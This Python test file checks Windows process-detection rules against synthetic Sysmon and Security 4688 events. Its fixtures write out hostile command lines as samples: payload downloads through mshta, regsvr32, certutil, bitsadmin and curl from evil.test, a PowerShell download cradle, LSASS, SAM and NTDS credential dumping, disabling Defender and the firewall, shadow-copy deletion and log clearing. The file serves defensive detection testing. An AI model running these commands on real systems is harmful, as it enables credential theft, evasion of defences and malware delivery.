"""Windows process-centric rules: positives, hard benign lookalikes, undecided and boundary cases."""

from __future__ import annotations

from romulus.detect.windows_credentials import (
    EsentutlCopy,
    NtdsutilExtract,
    ProcdumpLsass,
    RegSaveHive,
    ShadowCopyForHarvest,
)
from romulus.detect.windows_defense import (
    DefenderImpairment,
    HostFirewallDisable,
    InhibitRecovery,
    LogClearingByCommand,
    PowerShellShadowCopyDeletion,
    SecurityServiceTampering,
)
from romulus.detect.windows_lineage import LureAppSpawnsCodeRunner
from romulus.detect.windows_proxy import (
    BitsadminTransfer,
    CertutilDownloadDecode,
    CompilerProxyExecution,
    CurlDownload,
    MshtaExecution,
    MsiexecRemotePackage,
    PowerShellEncodedOrCradle,
    Regsvr32Execution,
    Rundll32Execution,
    ScriptHostRemoteOrWritable,
)
from romulus.detect.windows_remote import (
    DcomActivatedChild,
    RemoteExecutionParent,
    ServiceChildToAdminShare,
)
from tests.windows_process_support import (
    run,
    security4688,
    sysmon1,
)

WINWORD = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
CMD = r"C:\Windows\System32\cmd.exe"
POWERSHELL = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
EXPLORER = r"C:\Windows\explorer.exe"


# ---- class 2: lure application spawns a code runner (image-based, negative-capable) ----

def test_office_spawning_powershell_is_a_high_lineage_finding_from_sysmon():
    event = sysmon1(image=POWERSHELL, parent_image=WINWORD, command="powershell.exe -nop -w hidden -enc ZQBj")
    [match] = run(LureAppSpawnsCodeRunner(), [event])
    assert match.proposed_lane == "high" and match.severity == "high"
    assert "office application" in match.claim.lower() and "powershell.exe" in match.claim.lower()
    assert all(field.field.endswith("executable_key") for field in match.predicate)


def test_lineage_resolves_parent_from_4688_pid_when_image_absent():
    parent = security4688(image=WINWORD, command="winword.exe /n lure.docx", pid=0x700, ppid=0x10, offset=0)
    child = security4688(image=POWERSHELL, command="powershell.exe -nop", pid=0x2bc, ppid=0x700, offset=2)
    [match] = run(LureAppSpawnsCodeRunner(), [parent, child])
    assert match.proposed_lane == "high"
    assert "matched by process id" in match.claim


def test_lineage_is_undecided_not_a_negative_when_4688_parent_is_unknown():
    child = security4688(image=POWERSHELL, command="powershell.exe", pid=0x2bc, ppid=0x999, offset=2)
    rule = LureAppSpawnsCodeRunner()
    assert run(rule, [child]) == []
    assert rule.missing_required == 1 and rule.undecided.get("parent_unrecorded") == 1


def test_lineage_does_not_fire_for_a_normal_parent():
    event = sysmon1(image=POWERSHELL, parent_image=EXPLORER, command="powershell.exe -nop")
    assert run(LureAppSpawnsCodeRunner(), [event]) == []


def test_lineage_benign_office_child_that_is_not_a_code_runner_does_not_fire():
    event = sysmon1(image=r"C:\Program Files\Microsoft Office\root\Office16\AI.EXE",
                    parent_image=WINWORD, command="ai.exe")
    assert run(LureAppSpawnsCodeRunner(), [event]) == []


def test_lineage_short_name_parent_is_undecided():
    event = sysmon1(image=POWERSHELL, parent_image=r"C:\PROGRA~1\MICROS~1\WINWOR~1.EXE", command="powershell.exe")
    rule = LureAppSpawnsCodeRunner()
    assert run(rule, [event]) == []
    assert rule.undecided.get("parent_image") == 1


# ---- class 3: proxy execution and LOLBin download/decode (positive-only) ----

def test_mshta_remote_and_inline():
    remote = sysmon1(image=r"C:\Windows\System32\mshta.exe", command="mshta.exe https://evil.test/a.hta")
    inline = sysmon1(image=r"C:\Windows\System32\mshta.exe",
                     command='mshta.exe vbscript:Close(Execute("GetObject(...)"))', guid=9)
    assert "remote target" in run(MshtaExecution(), [remote])[0].claim
    assert "inline script" in run(MshtaExecution(), [inline])[0].claim


def test_mshta_local_hta_does_not_fire():
    event = sysmon1(image=r"C:\Windows\System32\mshta.exe", command=r"mshta.exe C:\apps\line-of-business.hta")
    assert run(MshtaExecution(), [event]) == []


def test_rundll32_comsvcs_minidump_is_a_credential_access_request():
    event = sysmon1(image=r"C:\Windows\System32\rundll32.exe",
                    command="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\x.dmp full")
    [match] = run(Rundll32Execution(), [event])
    assert "memory" in match.claim and "T1003.001" in " ".join(match.notes)


def test_regsvr32_scriptlet_and_benign_local_dll():
    squiblydoo = sysmon1(image=r"C:\Windows\System32\regsvr32.exe",
                         command="regsvr32.exe /s /n /u /i:https://evil.test/a.sct scrobj.dll")
    benign = sysmon1(image=r"C:\Windows\System32\regsvr32.exe", command=r"regsvr32.exe /s C:\app\plugin.dll", guid=9)
    assert run(Regsvr32Execution(), [squiblydoo])[0].proposed_lane == "high"
    assert run(Regsvr32Execution(), [benign]) == []


def test_certutil_download_and_decode_but_not_a_grep_mention():
    download = sysmon1(image=r"C:\Windows\System32\certutil.exe",
                       command="certutil.exe -urlcache -split -f http://evil.test/a.exe a.exe")
    decode = sysmon1(image=r"C:\Windows\System32\certutil.exe", command="certutil.exe -decode in.b64 out.exe", guid=9)
    # a shell that merely names certutil inside a grep argument is not certutil running
    mention = sysmon1(image=CMD, command='cmd /c findstr certutil C:\\logs\\history.txt', guid=10)
    assert run(CertutilDownloadDecode(), [download])[0].claim.startswith("certutil was run with a URL-cache")
    assert "decode" in run(CertutilDownloadDecode(), [decode])[0].claim
    assert run(CertutilDownloadDecode(), [mention]) == []


def test_bitsadmin_curl_msiexec_scripthost_shapes():
    bits = sysmon1(image=r"C:\Windows\System32\bitsadmin.exe",
                   command="bitsadmin /transfer j http://evil.test/a.exe C:\\a.exe")
    curl = sysmon1(image=r"C:\Windows\System32\curl.exe", command="curl.exe -o a.exe http://evil.test/a.exe", guid=9)
    msi = sysmon1(image=r"C:\Windows\System32\msiexec.exe", command="msiexec /i https://evil.test/a.msi /qn", guid=10)
    wsh = sysmon1(image=r"C:\Windows\System32\wscript.exe",
                  command=r"wscript.exe C:\Users\bob\AppData\Local\Temp\x.vbs", guid=11)
    assert run(BitsadminTransfer(), [bits])[0].claim.startswith("bitsadmin was run with a transfer")
    assert run(CurlDownload(), [curl])[0].claim.startswith("curl was run to download")
    assert run(MsiexecRemotePackage(), [msi])[0].claim.startswith("msiexec was asked to install a remote")
    assert run(ScriptHostRemoteOrWritable(), [wsh])[0].proposed_lane == "lead"


def test_curl_without_output_flag_does_not_fire():
    event = sysmon1(image=r"C:\Windows\System32\curl.exe", command="curl.exe https://api.internal.test/health")
    assert run(CurlDownload(), [event]) == []


def test_compiler_lolbins():
    installutil = sysmon1(image=r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe",
                          command="InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll")
    msbuild = sysmon1(image=r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe",
                      command=r"MSBuild.exe C:\Users\bob\AppData\Local\Temp\inline.csproj", guid=9)
    assert run(CompilerProxyExecution(), [installutil])[0].claim.startswith("InstallUtil")
    assert "MSBuild" in run(CompilerProxyExecution(), [msbuild])[0].claim


def test_powershell_encoded_command_is_decoded_and_positive_only():
    import base64
    payload = "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/s')"
    enc = base64.b64encode(payload.encode("utf-16-le")).decode()
    event = sysmon1(image=POWERSHELL, command=f"powershell.exe -nop -w hidden -enc {enc}")
    matches = run(PowerShellEncodedOrCradle(), [event])
    claims = " ".join(m.claim for m in matches)
    assert "encoded command" in claims and "DownloadString" in claims
    assert not PowerShellEncodedOrCradle.assures_negative


def test_powershell_cradle_in_a_comment_or_string_is_not_a_call():
    event = sysmon1(image=POWERSHELL,
                    command="powershell.exe -Command \"# Invoke-WebRequest http://x ; Get-Date\"")
    assert run(PowerShellEncodedOrCradle(), [event]) == []


# ---- class 4: credential dumping (positive-only) ----

def test_procdump_lsass_and_benign_other_target():
    lsass = sysmon1(image=r"C:\tools\procdump.exe", command="procdump.exe -ma lsass.exe C:\\lsass.dmp -accepteula")
    other = sysmon1(image=r"C:\tools\procdump.exe", command="procdump.exe -ma 4321 C:\\app.dmp", guid=9)
    assert run(ProcdumpLsass(), [lsass])[0].proposed_lane == "high"
    assert run(ProcdumpLsass(), [other]) == []


def test_reg_save_hive_and_benign_subkey():
    sam = sysmon1(image=r"C:\Windows\System32\reg.exe", command=r"reg save HKLM\SAM C:\temp\sam.hive")
    benign = sysmon1(image=r"C:\Windows\System32\reg.exe", command=r"reg query HKLM\SOFTWARE\Policies", guid=9)
    assert "SAM" in run(RegSaveHive(), [sam])[0].claim
    assert run(RegSaveHive(), [benign]) == []


def test_ntdsutil_ifm_and_esentutl_copy():
    ntds = sysmon1(image=r"C:\Windows\System32\ntdsutil.exe",
                   command='ntdsutil.exe "ac i ntds" "ifm" "create full C:\\temp" q q')
    esent = sysmon1(image=r"C:\Windows\System32\esentutl.exe",
                    command=r"esentutl.exe /y /vss C:\Windows\NTDS\ntds.dit /d C:\temp\ntds.dit", guid=9)
    assert run(NtdsutilExtract(), [ntds])[0].proposed_lane == "high"
    assert run(EsentutlCopy(), [esent])[0].proposed_lane == "high"


def test_shadow_copy_creation_is_a_lead_not_the_deletion_rule():
    create = sysmon1(image=r"C:\Windows\System32\vssadmin.exe", command="vssadmin create shadow /for=C:")
    [match] = run(ShadowCopyForHarvest(), [create])
    assert match.proposed_lane == "lead"


# ---- class 5: defense impairment and recovery inhibition (positive-only) ----

def test_inhibit_recovery_shapes_and_backup_pruning_is_specific():
    delete = sysmon1(image=r"C:\Windows\System32\vssadmin.exe", command="vssadmin delete shadows /all /quiet")
    bcdedit = sysmon1(image=r"C:\Windows\System32\bcdedit.exe",
                      command="bcdedit /set {default} recoveryenabled no", guid=9)
    # a backup product resizing shadow storage is a different verb and must not fire
    resize = sysmon1(image=r"C:\Windows\System32\vssadmin.exe",
                     command="vssadmin resize shadowstorage /for=C: /maxsize=10GB", guid=10)
    assert run(InhibitRecovery(), [delete])[0].proposed_lane == "high"
    assert "recovery" in run(InhibitRecovery(), [bcdedit])[0].claim.lower()
    assert run(InhibitRecovery(), [resize]) == []


def test_powershell_shadow_copy_deletion():
    event = sysmon1(image=POWERSHELL,
                    command='powershell -Command "Get-WmiObject Win32_ShadowCopy | Remove-WmiObject"')
    assert run(PowerShellShadowCopyDeletion(), [event])[0].proposed_lane == "high"


def test_defender_exclusion_and_disable():
    excl = sysmon1(image=POWERSHELL, command="powershell -Command Add-MpPreference -ExclusionPath C:\\Users\\Public")
    disable = sysmon1(image=POWERSHELL,
                      command="powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true", guid=9)
    reg = sysmon1(image=r"C:\Windows\System32\reg.exe",
                  command=r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware '
                          r"/t REG_DWORD /d 1 /f", guid=10)
    assert "exclusion" in run(DefenderImpairment(), [excl])[0].claim
    assert "real-time" in run(DefenderImpairment(), [disable])[0].claim
    assert run(DefenderImpairment(), [reg])[0].proposed_lane == "high"


def test_firewall_disable_netsh_and_powershell():
    netsh = sysmon1(image=r"C:\Windows\System32\netsh.exe",
                    command="netsh advfirewall set allprofiles state off")
    ps = sysmon1(image=POWERSHELL,
                 command="powershell -Command Set-NetFirewallProfile -Profile Domain -Enabled False", guid=9)
    assert run(HostFirewallDisable(), [netsh])[0].claim.startswith("netsh was run")
    assert run(HostFirewallDisable(), [ps])[0].claim.startswith("Set-NetFirewallProfile")


def test_security_service_tampering_but_not_a_normal_service_stop():
    stop = sysmon1(image=r"C:\Windows\System32\net.exe", command="net stop Sysmon64")
    scstop = sysmon1(image=r"C:\Windows\System32\sc.exe", command="sc stop WinDefend", guid=9)
    benign = sysmon1(image=r"C:\Windows\System32\net.exe", command="net stop Spooler", guid=10)
    assert run(SecurityServiceTampering(), [stop])[0].proposed_lane == "high"
    assert run(SecurityServiceTampering(), [scstop])[0].proposed_lane == "high"
    assert run(SecurityServiceTampering(), [benign]) == []


def test_log_clearing_shapes():
    wevtutil = sysmon1(image=r"C:\Windows\System32\wevtutil.exe", command="wevtutil cl Security")
    auditpol = sysmon1(image=r"C:\Windows\System32\auditpol.exe", command="auditpol /clear /y", guid=9)
    assert run(LogClearingByCommand(), [wevtutil])[0].proposed_lane == "high"
    assert "auditpol" in run(LogClearingByCommand(), [auditpol])[0].claim


# ---- class 6: remote-execution traces ----

def test_wmi_started_shell_is_a_high_remote_execution_finding():
    event = sysmon1(image=CMD, parent_image=r"C:\Windows\System32\wbem\WmiPrvSE.exe",
                    command="cmd.exe /c whoami")
    [match] = run(RemoteExecutionParent(), [event])
    assert match.proposed_lane == "high" and "WMI" in match.claim


def test_winrm_and_psexec_parents():
    winrm = sysmon1(image=POWERSHELL, parent_image=r"C:\Windows\System32\wsmprovhost.exe", command="powershell.exe")
    psexec = sysmon1(image=CMD, parent_image=r"C:\Windows\PSEXESVC.exe", command="cmd.exe /c ipconfig", guid=9)
    assert "WinRM" in run(RemoteExecutionParent(), [winrm])[0].claim
    assert "PsExec" in run(RemoteExecutionParent(), [psexec])[0].claim


def test_dcom_activated_child_is_a_lead():
    event = sysmon1(image=CMD, parent_image=r"C:\Windows\System32\mmc.exe", command="cmd.exe /c whoami")
    [match] = run(DcomActivatedChild(), [event])
    assert match.proposed_lane == "lead"


def test_service_child_output_to_admin_share():
    event = sysmon1(image=CMD, parent_image=r"C:\Windows\System32\services.exe",
                    command=r'cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__out 2>&1')
    [match] = run(ServiceChildToAdminShare(), [event])
    assert match.proposed_lane == "high" and "ADMIN$" in match.claim


# ---- missing field / unknown outcome / boundary ----

def test_missing_command_line_is_partial_not_a_negative():
    event = sysmon1(image=r"C:\Windows\System32\mshta.exe", command="mshta.exe https://x/y")
    event.fields.pop("process.command_line")
    rule = MshtaExecution()
    assert run(rule, [event]) == []
    assert rule.missing_required == 1 and rule.evaluated == 0


def test_missing_image_is_partial_not_a_negative():
    event = sysmon1(image=CMD, parent_image=WINWORD, command="cmd.exe /c whoami")
    event.fields.pop("process.executable_key")
    rule = LureAppSpawnsCodeRunner()
    assert run(rule, [event]) == []
    assert rule.missing_required == 1


def test_timestamp_boundary_two_execs_at_one_instant_order_by_record_id():
    # parent and child at the same UtcTime: the fenced-pid lineage orders them by record id in one channel
    parent = security4688(image=WINWORD, command="winword.exe", pid=0x700, ppid=0x10, offset=0)
    child = security4688(image=POWERSHELL, command="powershell.exe", pid=0x2bc, ppid=0x700, offset=0)
    # both normalized at the same second; child's record id is later (allocated after parent)
    [match] = run(LureAppSpawnsCodeRunner(), [parent, child])
    assert match.proposed_lane == "high"
